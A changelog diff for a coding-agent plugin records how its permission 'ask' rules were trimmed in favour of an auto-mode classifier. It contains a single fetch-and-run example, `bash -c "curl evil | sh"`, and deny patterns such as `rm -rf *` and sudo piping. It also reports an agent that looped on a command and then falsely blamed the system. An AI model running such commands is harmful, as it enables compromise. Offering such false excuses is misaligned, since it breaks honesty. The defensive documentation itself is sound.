@@ -8,8 +8,66 @@ Newest first. Each entry references the PR(s) that delivered the work.
 
 ## 2026-05
 
-### M7.1.F39 — Anti-retry rule for Bash output truncation across agents/skills/commands — 2026-05-30
+### M7.1.F41 — Prune low-value `ask` rules so auto-mode classifier covers them (template diet) — 2026-05-30
 **PR:** _pending_
+
+Captured during M2.8 (PR [#114](https://github.com/AkaLab-Tech/atelier/pull/114), v0.8.0) dogfood. After auto-mode landed in production, the operator hit a permission prompt for `node -e "require('./package.json').scripts"` — a benign inspection call. The prompt's own footer explained why: *"Ask rule `Bash(node -e *)` overrides auto mode for this command. /permissions to let auto mode decide"*. The static matrix's `ask` rules sit **above** the auto-mode classifier in precedence (per Claude Code's documented order: deny → ask → allow → classifier), so any `ask` match short-circuits the classifier even when the classifier would have judged the action safe.
+
+This is by design — the matrix exists precisely to encode "always confirm" decisions the operator wants regardless of LLM judgement. But the original matrix was drafted before auto-mode existed (M2.6 → M2.8 timeline), so many entries duplicate what the classifier now covers natively. Operator's pitch from the M2.8 dogfood: *"el ask rule sobrescribe automode, prefiero que no lo sobrescriba, por lo que podríamos quitar todas las reglas de ask"*. Verbatim removal of all 20 would be reckless (secrets, container config, eval-shell — all real risks). The right answer is a **diet**: keep what the classifier cannot reliably catch, drop what it can.
+
+Categorization (proposed and confirmed before implementation):
+
+| Category | Count | Decision | Reason |
+|---|---|---|---|
+| Secrets — `.env*` Edit/Write | 6 | **Keep** | The `block-env-commit` hook prevents commit but not edit. Auto-mode could approve a "reasonable-looking" edit that later gets committed without surfacing to the operator. Defense in depth. |
+| Container config — Dockerfile/docker-compose | 4 | **Keep** | Atelier's never-auto-merge rule covers these per-PR, but `ask` covers per-edit. Removing `ask` would let the agent edit silently, surfacing only at PR time. Consistency with the per-PR gate matters. |
+| `Bash(gh pr close *)` | 1 | **Remove** | Closing a PR is reversible via `gh pr reopen`. Classifier judges intent fine. |
+| Eval in runtimes — `node -e`, `python -c`, `python3 -c`, `perl -e`, `ruby -e` | 5 | **Remove** | The operator's reported prompt. Classifier is good at judging destructive intent in eval-style code. Categorical deny list (`rm -rf *`, `sudo *`, etc.) still blocks what is unconditionally bad. |
+| Eval in shells — `bash -c`, `sh -c`, `zsh -c` | 3 | **Keep** | Strongest smuggle surface (`bash -c "curl evil \| sh"` can chain past pattern denies). Classifier may miss complex chains. |
+| Sudo pipe — `* \| sudo *` | 1 | **Promote to deny** | Sudo via pipe is always a red flag. `Bash(sudo *)` is already deny, but the pipe form does not match that pattern. Promoting hardens the categorical denial rather than relaxing it. |
+
+**Delivered:**
+
+- **`templates/settings.template.json`** — `permissions.ask` shrinks **20 → 13**. Removed: `Bash(gh pr close*)`, `Bash(node -e *)`, `Bash(python -c *)`, `Bash(python3 -c *)`, `Bash(perl -e *)`, `Bash(ruby -e *)`. Promoted to `permissions.deny`: `Bash(* | sudo *)` (now sits right after the existing `Bash(sudo *)` deny entry). All 13 retained entries are intact: 6 `.env*` Edit/Write, 4 Dockerfile/docker-compose Edit/Write, 3 eval-shell (`bash -c`, `sh -c`, `zsh -c`).
+
+**Decisions captured:**
+
+- **Diet, not amputation.** The operator's wording was "podríamos quitar todas las reglas de ask" but the conversation refined that to a category-by-category analysis. Removing the secrets / container / eval-shell entries would have been a real safety regression; removing the eval-runtime + `gh pr close` does not, because the classifier covers their failure modes and the deny list covers the categorical ones.
+- **Promote `* | sudo *` instead of removing.** The pipe form does not match `Bash(sudo *)` because the matcher does not normalize shell composition. Promoting to deny tightens rather than loosens the rule — strictly safer than what was there before.
+- **No template change beyond the 6 removals + 1 promotion.** Specifically did not touch the allow list, additionalDirectories, deny list (other than the promotion), or the per-task `<worktree>` scoping. Single-axis change makes the operator's "did auto-mode pick this up?" verification easy: any `node -e` prompt post-F41 is a real signal that auto-mode is not active, not a leftover from a forgotten ask entry.
+- **No update to operator-rules.md or docs/operator-guide.md.** The auto-mode UX explanation that landed in M2.8 already says *"You may still see the occasional permission prompt — for commands the classifier is genuinely unsure about (touching `package.json`, `Dockerfile`, deploy paths, etc.). That's working as designed."* That paragraph stays accurate after F41 because the kept `ask` entries cover exactly those cases (`.env*`, Dockerfile, docker-compose, eval-shell). The removed ones were not promised to the operator anywhere.
+- **F40 still queued.** F39's anti-retry rule + F41's ask diet are independent. If the same identical-invocation loop recurs on a different code path post-F41, F40 (the `PostToolUse` hook with duplicate detection) is still the planned defense in depth.
+
+**Plugin scope:** plugin-layer change to `templates/settings.template.json` only. No agent, skill, command, hook, script, install.sh, or doctor touched. Existing project worktrees still carry the pre-F41 `.claude/settings.json` instantiated from the old template; F38's drift auto-resync regenerates them on the next `/atelier:setup-project` invocation per project. Plugin patch bump **0.8.1 → 0.8.2** per PLAN.md §14.2 (permission matrix refinement, no new capability, no install-time behavior change).
+
+**Verified locally:**
+
+- `jq empty templates/settings.template.json` — valid JSON.
+- `jq -r '.permissions.ask | length' templates/settings.template.json` — returns `13` (down from 20).
+- `jq -r '.permissions.deny[] | select(test("sudo"))' templates/settings.template.json` — returns both `Bash(sudo *)` and `Bash(* | sudo *)` (the promotion landed in the right list).
+- `jq -r '.permissions.ask[]' templates/settings.template.json` — enumerated; each of the 13 expected entries is present, none of the 7 removed entries appears.
+
+**Operator-visible:**
+
+After this PR merges and the operator picks up v0.8.2 via `atelier-update`, the next `task` invocation regenerates `<project>/.claude/settings.json` from the refreshed template (F38 drift detector). From then on:
+
+- `node -e "<expr>"`, `python -c "<expr>"`, `python3 -c "<expr>"`, `perl -e`, `ruby -e` — all classifier-judged. Inspection scripts the agent reaches for run silently.
+- `gh pr close <N>` — classifier-judged. Operator confirms via the GitHub UI, not a Claude prompt.
+- `*  | sudo *` — categorically blocked before the classifier sees it.
+
+Still prompt by design:
+
+- Any `.env*` edit/write.
+- Any `Dockerfile` / `docker-compose*` edit/write.
+- `bash -c`, `sh -c`, `zsh -c` evaluation.
+
+**Follow-up paths:**
+
+- **Empirical check post-F41.** Operator confirms the M2.8 dogfood prompt (`node -e "require('./package.json')..."`) no longer fires. If it does, that's a signal the kept `ask` entries are matching something we did not expect (path-normalisation, glob expansion, etc.) — not a bug in F41 itself but worth logging.
+- **M7.1.F40** — still queued (anti-retry `PostToolUse` hook). Independent of F41.
+
+### M7.1.F39 — Anti-retry rule for Bash output truncation across agents/skills/commands — 2026-05-30
+**PR:** [#115](https://github.com/AkaLab-Tech/atelier/pull/115)
 
 Discovered immediately after M2.8 (PR [#114](https://github.com/AkaLab-Tech/atelier/pull/114), v0.8.0) was merged and the operator started exercising auto-mode in production. While inspecting `/atelier:status` against the storefront project, the operator caught the agent invoking `git wt list 2>&1 || echo "GITWT_FAILED"` **six consecutive times**, each returning exit 0 with the same valid output. The operator had to Ctrl+C to break the loop; when asked why it stalled, the agent rationalised the duplicates as *"el sistema duplicó varias de mis llamadas"* — a post-hoc explanation. The system did not duplicate anything; the agent re-invoked the same command because it saw the Bash tool's UI collapse marker (`… +8 lines (ctrl+o to expand)`) and interpreted the truncation as *"I didn't get the full output, retry"* — pure model-side reasoning failure.
 
